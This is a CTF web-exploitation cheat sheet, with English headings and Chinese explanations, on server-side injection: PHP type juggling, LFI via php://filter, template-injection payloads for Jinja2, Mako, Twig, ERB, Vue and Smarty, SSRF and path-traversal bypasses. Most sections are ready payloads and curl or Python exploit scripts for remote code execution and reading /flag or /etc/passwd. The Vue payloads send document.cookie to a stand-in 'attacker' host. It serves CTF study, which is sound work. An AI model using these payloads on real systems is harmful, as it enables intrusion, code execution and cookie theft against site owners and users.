# CTF Web - Server-Side Injection Attacks

## Table of Contents
- [PHP 类型杂糅](#php-type-juggling)
- [PHP 文件包含 / php://filter](#php-file-inclusion--phpfilter)
- [SQL 注入](#sql-injection) — 已移至 [sql-injection.md](sql-injection.md)
- [Python str.format() 属性遍历（PlaidCTF 2017）](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSTI（服务端模板注入）](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go 模板注入](#go-template-injection)
  - [EJS 服务端模板注入](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES 绕过（BearCatCTF 2026）](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [通过 toString.constructor 的 Vue.js 模板注入（VolgaCTF 2018）](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
  - [通过 `__dict__.update()` 绕过 SSTI 引号过滤（ApoorvCTF 2026）](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host 头 SSRF（MireaCTF）](#host-header-ssrf-mireactf)
  - [用于 TOCTOU（检查时与使用时）的 DNS Rebinding](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
  - [Curl 重定向链绕过](#curl-redirect-chain-bypass)
  - [未转义点号 regex allowlist 绕过（Meepwn CTF Quals 2018）](#unescaped-dot-regex-allowlist-bypass-meepwn-ctf-quals-2018)
  - [基于 SNI 的 HTTPS 到 FTP 协议走私（PlaidCTF 2018）](#sni-based-ftp-protocol-smuggling-via-https-plaidctf-2018)
  - [通过 Host 头覆写 Docroot 的 Apache mod_vhost_alias（RCTF 2018）](#apache-mod_vhost_alias-docroot-override-via-host-header-rctf-2018)
- [数组输入让 PHP hash_hmac 返回 NULL（AceBear 2018）](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
- [经 CVE-2017-1000480 注释注入的 Smarty SSTI（Insomni'hack 2018）](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
- [递归替换路径遍历 `....//`（35C3 2018）](#recursive-replace-traversal--35c3-2018)
- [PHP `(int)` 强转前导数字路径遍历（35C3 2018）](#php-int-cast-leading-number-traversal-35c3-2018)
- [`strpos` 子串匹配黑名单绕过（TUCTF 2018）](#strpos-substring-match-blacklist-bypass-tuctf-2018)
- [按 User-Agent 区分的 robots.txt（TAMUctf 2019）](#user-agent-gated-robotstxt-tamuctf-2019)
- [PHP log()/INF 数学相等 + 递归 urldecode()（Pragyan CTF 2019）](#php-loginf-math-equality--recursive-urldecode-pragyan-ctf-2019)

XXE、XML 注入、PHP variable-variable 滥用、uniqid/regex 绕过、命令注入与 GraphQL 利用见 [server-side-2.md](server-side-2.md)。代码执行类攻击（Ruby/Perl/JS/LaTeX/Prolog 注入、PHP `preg_replace /e`、ReDoS、上传到 RCE、PHP 反序列化、XPath 注入、Thymeleaf SpEL SSTI）见 [server-side-exec.md](server-side-exec.md)。SQLi 关键字碎片化、SQL WHERE 绕过、经 DNS 的 SQL、bash 花括号展开、Common Lisp 注入、PHP7 OPcache 等见 [server-side-exec-2.md](server-side-exec-2.md)。反序列化攻击（Java、Pickle）与竞争条件见 [server-side-deser.md](server-side-deser.md)。CVE 专项利用、路径遍历绕过、Flask/Werkzeug debug 与其他高级技巧见 [server-side-advanced.md](server-side-advanced.md)。

---

## PHP Type Juggling

**模式：** PHP 宽松比较（`==`）会隐式做类型转换，容易得到意外的相等结果，从而绕过认证和校验。

**比较表（在 `==` 下都为 `true`）：**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | 非数字字符串会转换成 `0` |
| `0 == ""` | `true` | 空字符串会转换成 `0` |
| `"0" == false` | `true` | `"0"` 为 falsy |
| `NULL == false` | `true` | 二者都为 falsy |
| `NULL == ""` | `true` | 二者都为 falsy |
| `NULL == array()` | `true` | 二者都为空 |
| `"0e123" == "0e456"` | `true` | 两者都按科学计数法解析为 `0` |

**通过类型杂糅做认证绕过：**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**通过 JSON 类型混淆利用：**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**利用数组绕过 `strcmp`：**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

**防御：** 使用严格比较（`===`），同时检查值与类型。

**关键点：** 面对 PHP 比较端点时，始终测试 `0`、`""`、`NULL`、`[]` 与 `"0e..."` magic hash。若支持 JSON `Content-Type`，就能在应用期望字符串时传入整数 `0`。

---

## PHP File Inclusion / php://filter

**模式：** PHP `include`、`require`、`require_once` 接受动态路径。结合 `php://filter` 时，可在不执行代码的前提下泄露源码。

**基本 LFI：**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**通过 `php://filter` 泄露源码：**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**用于 RCE 的过滤链（PHP >= 7）：**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**常见 LFI 目标：**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

**关键点：** `php://filter/convert.base64-encode/resource=` 是通过 LFI 读取 PHP 源码时最稳定的方法，因为 base64 编码能阻止目标文件被当作 PHP 执行。

---

## SQL Injection

SQL 注入技巧已拆分到独立文件。全部内容见 [sql-injection.md](sql-injection.md)。

---

## Python str.format() Attribute Traversal (PlaidCTF 2017)

**模式：** Python 的 `str.format()` 允许对格式化参数做属性访问与索引访问。只要用户输入进入 `.format(obj)`，攻击者就能读取传入对象的任意属性。

```python
# Leak object attributes via format string
payload = "{0.__class__.__mro__}"
payload = "{0.secret_field}"

# In Flask: endpoint uses new_name.format(player_object)
# Send: {0.pykemon} to leak all pykemon objects

# Access nested attributes
"{0.__class__.__init__.__globals__}"

# Dictionary key access via bracket notation
"{0[secret_key]}"

# Chaining attribute and index access
"{0.__class__.__mro__[1].__subclasses__()}"
```

**常见易受攻击模式：**
```python
# Vulnerable: user input as format string
greeting = user_input.format(current_user)

# Vulnerable: format with request object
message = template_str.format(request)

# Safe alternative: use positional or keyword args only
greeting = "Hello, {name}!".format(name=user_input)
```

**关键点：** 与 `%s` 不同，Python `str.format()` 支持点号属性遍历（`{0.attr.subattr}`）和方括号索引（`{0[key]}`），因此一旦 format string 可控，就会变成信息泄露点。这与 SSTI 不同，不需要模板引擎，只要存在用户可控的 `.format()` 调用即可。重点找 Flask/Django 视图中把用户输入用于 `.format()`，且传入 model 对象或 request 对象的场景。

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**模式（Checking It Twice）：** 用户输入在错误处理路径中传给 `ejs.render()`。
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**模式（Treasure Hunt 5）：** Sinatra（Ruby）应用使用 ERB 模板。ERBSandbox 限制直接访问数据库，但全局列表 `Sequel::DATABASES` 不受限制。

**检测：** Ruby/Sinatra 应用，源码中有 `require 'erb'`。Cookie 或参数会反射到渲染后的响应中。

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**关键点：** 即使 ERB 沙箱屏蔽了 `DB` 或 `DATABASE` 常量，`Sequel::DATABASES` 仍是一个列出全部已打开 Sequel 连接的全局数组，可绕过基于变量名的限制。在 Sinatra 中，凡是通过 ERB 模板反射的 Cookie 或参数里能放 `<%= ... %>`，通常都是 SSTI 向量。

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**关键点：** Mako（Python）会在 `${}` 或 `<% %>` 中直接执行 Python 代码，无沙箱，也不需要类遍历。检测方式与 Jinja2 类似（`${7*7}`），但 payload 就是原生 Python。

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**关键点：** 用 `{{7*'7'}}` 可区分 Twig 与 Jinja2。Twig 会返回字符串重复结果 `7777777`，Jinja2 返回 `49`。Twig 3.x 移除了 `_self.env` 访问，因此改用 `|map('system')` 这类过滤器链。

### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)

**模式：** Vue.js 客户端模板注入可通过构造器链执行 JavaScript。当用户输入被渲染进 Vue 模板（通过 `v-html`、服务端插值进 Vue 模板、或反射进 `{{ }}` 分隔符）时，模板表达式求值器会执行 JS。

**基础 payload：**
```javascript
// Constructor chaining to create and execute a Function object
${toString.constructor('document.location="http://attacker/?"+document.cookie')()}

// Alternative constructor chain
{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}

// Using the _c (createElement) internal to confirm Vue context
{{_c.constructor('return 1')()}}
```

**适配不同 Vue 版本的变体：**
```javascript
// Vue 2.x — template expressions have access to the component scope
{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}

// Vue 2.x — via toString
${toString.constructor('alert(document.domain)')()}

// Vue 3.x — stricter sandbox, but constructor chaining still works
{{(_=toString.constructor('return document'))().cookie}}
```

**检测与利用：**
```python
import requests

target = "http://target/page"

# Step 1: Detect Vue.js template injection
probes = [
    "{{7*7}}",           # Returns 49 if expressions evaluated
    "{{toString()}}",    # Returns [object Object] or similar
    "${7*7}",            # Template literal syntax (some Vue configs)
]
for probe in probes:
    r = requests.get(target, params={"name": probe})
    print(f"Probe: {probe} -> {r.text[:200]}")

# Step 2: Execute via constructor chain
payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
r = requests.get(target, params={"name": payload})
```

**关键点：** Vue.js 模板表达式会求值执行 JavaScript。只要用户输入被放进 Vue 模板，`toString.constructor(code)()` 就能创建并执行一个 `Function` 对象，从而绕过简单关键字过滤。这是因为任意对象的 `constructor` 属性都能通向 JS 的 `Function` 构造器。Vue 2.x 更宽松；Vue 3.x 表达式沙箱更严格，但构造器链通常仍可用。重点找引入 Vue.js 且用 `{{ }}` 或 `v-bind` 渲染反射输入的页面。

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**模式（KameHame-Hack）：** Jinja2 SSTI 中引号被过滤，导致字符串参数不可用。可以用 Python 关键字参数绕过，`__dict__.update(key=value)` 不需要引号。

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**工作方式：**
1. `player.__dict__.update(power_level=9999999)`：通过关键字参数直接修改对象属性，不需要引号
2. `or player.name`：`dict.update()` 返回 `None`（falsy），所以 Jinja2 最终渲染 `player.name`
3. 属性修改会在该会话后续请求中持续生效

**关键点：** 当 SSTI 过滤器封掉引号和字符串时，Python 的关键字参数语法（`func(key=value)`）可以完全不出现字符串分隔符。`__dict__.update()` 能直接改任意对象属性，从而绕过业务逻辑，如游戏状态、认证检查或权限等级。

### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)

**模式：** Smarty 3 < 3.1.32 在使用自定义模板资源时，会把模板源文件路径放进编译模板中的 PHP 注释 `/* ... */`。若该路径可由用户控制且未过滤 `*/`，则可注入 `*/phpcode();/*` 跳出注释并执行任意 PHP。

```text
# Vulnerable URL pattern — template ID/path is user-controlled:
http://target/?id=*/echo file_get_contents('/flag');/*

# What happens server-side in the compiled template:
# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
# The injected */ closes the comment, PHP code executes, /* reopens a comment
```

```php
// Smarty compiled template (simplified):
// Before injection:
<?php /* Smarty version x, compiled from "user_template_name" */ ?>

// After injection with id = */echo file_get_contents('/flag');/*
<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
// Breaks down to:
//   /* Smarty version x, compiled from "*/   ← comment ends here
//   echo file_get_contents('/flag');          ← PHP executes
//   /*" */                                    ← new comment
```

```python
import requests

# Basic file read
r = requests.get("http://target/", params={
    "id": "*/echo file_get_contents('/flag');/*"
})
print(r.text)

# RCE
r = requests.get("http://target/", params={
    "id": "*/system('id');/*"
})
print(r.text)

# If parentheses are filtered, use backtick execution:
r = requests.get("http://target/", params={
    "id": "*/echo `cat /flag`;/*"
})
```

**关键点：** Smarty 会把模板源路径放进 PHP 的 `/* ... */` 注释里。若路径可控且 `*/` 未过滤，任意 PHP 即可执行。该问题影响自定义 Smarty resource（模板名来自用户输入），不影响默认的文件型 resource handler。该问题在 Smarty 3.1.32 修复。重点找模板标识符从 URL 参数派生的 Smarty 渲染点。

---

## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)

**模式：** 当 `$data` 参数是数组而不是字符串时，PHP `hash_hmac()` 会返回 `NULL`（伴随 warning，而非 fatal error）。通过 POST 发送 `nonce[]=x`，可强制参数变成数组，使 HMAC 输出变得可预测，因为 `hash_hmac('sha256', NULL, $secret)` 等价于 `hash_hmac('sha256', '', $secret)`。更关键的是，当后续代码把这个坏掉的 `hash_hmac` 返回值 `NULL` 当作下一次 HMAC 的 key 时，后续全部 HMAC 都会用空 key 计算。

```php
// Vulnerable server code:
$nonce = $_POST['nonce'];
$secret = file_get_contents('/secret_key');
$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array

// Later: server uses $mac (NULL) as key for another HMAC
$token = hash_hmac('sha256', 'gimmeflag', $mac);
// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
// This is a known constant the attacker can precompute!
```

```python
import hmac
import hashlib
import requests

# Precompute the token that the server will generate when mac=NULL
# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
print(f"Predicted token: {known_token}")

# Force nonce to be an array, breaking hash_hmac
r = requests.post("http://target/getflag", data={
    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
    "token": known_token      # server-side comparison succeeds
})
print(r.text)
```

```text
# HTTP request showing the array injection:
POST /getflag HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nonce[]=x&token=<precomputed_hmac>
```

**关键点：** PHP 会静默做类型强制，`hash_hmac` 收到非字符串 `$data` 时返回 `NULL`/`false` 而不是直接报错。始终检查参数能否通过 `param[]=value` 被强制成数组。该模式也适用于其他 PHP 哈希函数：`md5(array())` 返回 `NULL`，`sha1(array())` 返回 `NULL`。任何把中间哈希结果继续当 key 使用的认证流程，都可能在中间哈希被强制成 `NULL` 时被击穿。

---

## SSRF

### Host Header SSRF (MireaCTF)

服务端代码使用 HTTP `Host` 头构造内部校验请求：
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**利用：**
1. 启动一个攻击者控制的服务，返回期望结果：
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. 通过 ngrok 或公网 VPS 暴露出去，然后发送伪造 Host 头的请求：
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**关键点：** 服务端发起的是 `http://<Host-header>/validate`，而不是固定的 `http://localhost/validate`。只要把 Host 设为攻击者控制的域名，校验请求就会被导到攻击者服务器并返回 `{"access": true}`，从而完全绕过基于 IP 的访问控制。

**检测：** 查找服务端是否用 `request.Host`、`request.headers['Host']`、`c.Request.Host`（Go/Gin）或 `$_SERVER['HTTP_HOST']`（PHP）来构造内部服务调用 URL。

---

### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
当超过 `CURLOPT_MAXREDIRS` 后，某些实现还会再发一次未经校验的请求：
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

### Unescaped-Dot Regex Allowlist Bypass (Meepwn CTF Quals 2018)

**模式：** SSRF 目标 allowlist 用正则如 `/^https?:\/\/meepwntube\.0x1337\.space$/` 实现，但作者忘了转义点号，于是 `.` 可以匹配任意字符。注册一个字面名称形态正确的域名（如 `meepwntubex0x1337.space`），再把 A 记录指向 `127.0.0.1`。

**利用：**
```bash
# Register meepwntubex0x1337.space, set A record → 127.0.0.1
curl "https://target/fetch?url=http://meepwntubex0x1337.space/internal"
# Regex: /meepwntube.0x1337.space$/ matches (each '.' matched as '.' OR 'x')
# DNS resolves to 127.0.0.1 → SSRF to internal services
```

**关键点：** URL allowlist 的 regex 里点号必须写成 `\.`，并且两端都要锚定（`^...$`）。未转义点号会把白名单变成通配前后缀匹配，只要攻击者域名骨架相似就能通过。再配合把 DNS 解析到 loopback 或内网地址，即可直接 SSRF 打内网。

**参考：** Meepwn CTF Quals 2018 — writeup 10441

### SNI-Based FTP Protocol Smuggling via HTTPS (PlaidCTF 2018)

**模式（idIoT: Camera）：** 某自定义 FTP 服务暴露了被动模式握手使用的 `IP` 命令。攻击者唯一原语是浏览器发起的 fetch（来自 XSS）。浏览器不会发送自定义 FTP 命令，但会发 HTTPS，而 TLS ClientHello 中的 Server Name Indication（SNI）是明文。FTP 服务会忽略未知命令，并把 `\n` 和 `\x00` 都当作命令结束符，因此可通过精心构造的主机名，把 FTP 命令嵌进它的解析器。

**利用：**
```text
# Victim SNI hostname encodes the FTP command. The SNI length field
# (2 bytes: 0x00 0x69) becomes 'i\n' when the first byte lines up with ASCII 'i'.
# Subsequent payload bytes carry 'IP 240.1.2.3\n' terminators.

https://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
```
1. 让 `ip8.8.8.8....xip.io` 解析到 FTP 服务端口。
2. 浏览器发送 TLS ClientHello，其中 SNI 字节里嵌入 `IP 240.1.2.3\n`。
3. FTP 服务的行解析器把这些 SNI 字节当成新的 `IP` 命令，重设被动模式目标为攻击者。
4. 后续 `PASV` 响应就会把受害客户端指向攻击者 IP，从而泄露上传的图片。

**关键点：** 任何“密文协议里仍有明文 framing”的位置（SNI、HTTP Host 头、ALPN）都可能成为走私面，只要服务端在底层直接解析原始字节。当受害浏览器不能直接说目标协议时，就找一种握手里会回显攻击者控制字节的协议，再调主机名使这些字节刚好组成目标解析器可接受的命令。

**参考：** PlaidCTF 2018 — writeup 10018

### Apache mod_vhost_alias Docroot Override via Host Header (RCTF 2018)

**模式：** 服务端使用 Apache `mod_vhost_alias`，并配置了诸如 `VirtualDocumentRoot /var/www/%0/` 的通配文档根，实际服务目录在请求时由 `Host` 头决定。PHP 沙箱原本把执行限制在 `/var/www/sandbox/<token>/` 内，但由于 docroot 本身来自请求头，只要设置 `Host: ../../var/www/`（或相邻 vhost），就能在 PHP 看到 `open_basedir` 之前把运行目录移出沙箱。

**利用：**
```http
GET /shell.php HTTP/1.1
Host: ../admin
```
Apache 会把 docroot 解析为 `/var/www/admin`，于是请求直接落到本不该承载攻击者代码的目录，彻底绕过沙箱。

**关键点：** 一旦多租户 Apache 配置从用户可控输入（`Host`、`X-Forwarded-Host`、Cookie）计算 docroot，后续所有基于目录的隔离（PHP `open_basedir`、chroot helper）都依赖这些输入在 docroot 解析前被正确清洗。应通过 `ServerName`/`ServerAlias` 固定 docroot，或在 Apache 层直接拒绝含 `..`、`/`、NUL 的 Host。

**参考：** RCTF 2018 — writeup 10150

## Recursive-Replace Traversal `....//` (35C3 2018)

**模式：** 过滤器只做一次 `str_replace('../', '', $path)`。载荷 `....//` 正中间恰好包含一次 `../`，删掉后前后残留又会折叠成新的 `../`。

```text
Accept-Language: ....//....//....//....//flag
            →    ../ ../ ../ ../flag
```

**关键点：** 非递归的单轮删除会留下可重新拼成目标模式的残骸。`....//` 对应 `../`，`....\\\\` 对应 `..\`。一直试到过滤器迭代到不再变化为止。

**参考：** 35C3 CTF 2018 — flags, writeup 12831

---

## PHP (int) Cast Leading-Number Traversal (35C3 2018)

**模式：** 校验逻辑先把参数强转为 `(int)` 再与黑名单比较，但原始字符串稍后又被直接拼进文件路径。`(int) "-4133353959107185265/../../admin"` 会得到 `-4133353959107185265`，因此数值检查通过，而原始值中仍携带路径遍历。

```text
id=-4133353959107185265/../../admin
```

**关键点：** 任何“靠强转而不是解析”的校验，只会看到前导数字前缀。若同一原始字符串后续还会被复用，必须用严格正则（`^-?\d+$`）直接约束原始输入。

**参考：** 35C3 CTF 2018 — Not(e) accessible, writeup 12879

---

## strpos Substring-Match Blacklist Bypass (TUCTF 2018)

**模式：** PHP 用 `if (strpos($file, '/etc/passwd') == true) die();` 拦截 LFI 目标。`strpos` 返回的是子串位置（或 `false`），因此过滤器只会阻断路径中真的出现这个字面量的情况。任何最终落到别的文件上的遍历都能通过。

```php
# Bypass: file=../../TheEgg.html — strpos returns false, include proceeds
```

另外，`strpos(...) == true` 这种宽松比较还有一个细节：当匹配位置为 `0` 时不会被视为 `true`。所以这类 bug 的微妙版本会拦截偏移 `>=1` 的命中，但放过从偏移 `0` 开始的命中。

**关键点：** `strpos()`、`str_contains()`、`preg_match()` 只能做识别，不适合作为路径安全校验。处理文件名/路径时，应先 `realpath()`，再与允许的根目录做比较。

**参考：** TUCTF 2018 — Easter Egg: Crystal Gate, writeup 12380

---

## User-Agent-Gated robots.txt (TAMUctf 2019)

**模式：** `/robots.txt` 会根据 `User-Agent` 返回不同内容。普通浏览器 UA 看到的是诱饵文件；爬虫 UA（如 `Googlebot/2.1`）看到的才是真实 `Disallow:` 列表，而题目常把隐藏路径放在那里。

```bash
# Decoy
curl -s http://target/robots.txt
# "WHAT IS UP, MY FELLOW HUMAN! ..."

# Real file
curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
     http://target/robots.txt
# User-agent: Googlebot
# Disallow: /super-secret-admin-panel/
# Disallow: /flag-is-here.txt
```

当侦察中发现主题化的 robots.txt 诱饵时，始终轮换常见爬虫 UA：

```bash
for UA in \
  'Googlebot/2.1' \
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
  'facebookexternalhit/1.1' \
  'Slackbot-LinkExpanding 1.0' \
  'Twitterbot/1.0'; do
  echo "=== $UA ==="
  curl -s -A "$UA" http://target/robots.txt
done
```

**关键点：** 针对 bot 的内容协商不只会出现在 `robots.txt`，也常见于 `sitemap.xml`、`/.well-known/*`、首页等位置。它可能向人类浏览器隐藏路径，但对爬虫放开。始终测试 `User-Agent: Googlebot/2.1` 和其他主流爬虫标识。同一思路也常用于允许爬虫索引内容的付费墙，以及仅凭 UA 白名单放行爬虫的 WAF。

**参考：** TAMUctf 2019 — Robots Rule, writeup 13707

---

## PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)

**模式 1 — INF == INF：** PHP 对巨大浮点数做 `log()`/`log10()` 会返回 `INF`，且 `INF == INF` 为真。如下关卡：
```php
$a = hash('sha256', $a);              // 64 hex chars, e.g. "a..." -> string
$a = (log10($a ** 0.5)) ** 2;         // "a..." ** 0.5 -> INF, log10(INF) -> INF, **2 -> INF
if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* pass */ }
```
只要 `$c*$c + $d*$d` 也能变成 `INF`，检查就会通过。PHP 中 `7e1000`（超过 `DBL_MAX`）会被当作 `INF`，因此 `val3=1&val4=7E1000` 可在满足 `$d > $c` 的同时让两边都变成 `INF`。

**模式 2 — 递归 `urldecode` 循环：** 某循环要求 `$b != urldecode($b)` 连续成立十次，且最终值等于 `"WoAHh!"`。由于 `%25` 会解码成 `%`，每轮都会剥掉一层编码，所以把第一个字符编码九次即可。
```
WoAHh! -> %57oAHh! -> %2557oAHh! -> ... (10 layers) -> %2525252525252525252557oAHh!
```

```bash
curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
```

**关键点：** PHP 浮点比较接受 `INF == INF`，所以只要能把等式两边都推过 `DBL_MAX`，很多数学校验都会失效。被字符串化的 hash 在转浮点后通常会坍缩为 `0` 或 `INF`，因此 `sha256(x) ** 0.5` 与 `log*()` 都是经典“杂糅”原语。对递归解码循环来说，重复 `urldecode` 的不动点是“不再含 `%`”；用 `%25` 一层层包住某个字符即可强制执行精确 N 轮。

**参考：** Pragyan CTF 2019 — Mandatory PHP, writeup 13837

---

XXE、XML 注入、命令注入、GraphQL 以及剩余的 PHP 特定技巧（variable variables、uniqid、顺序 regex 绕过）见 [server-side-2.md](server-side-2.md)。
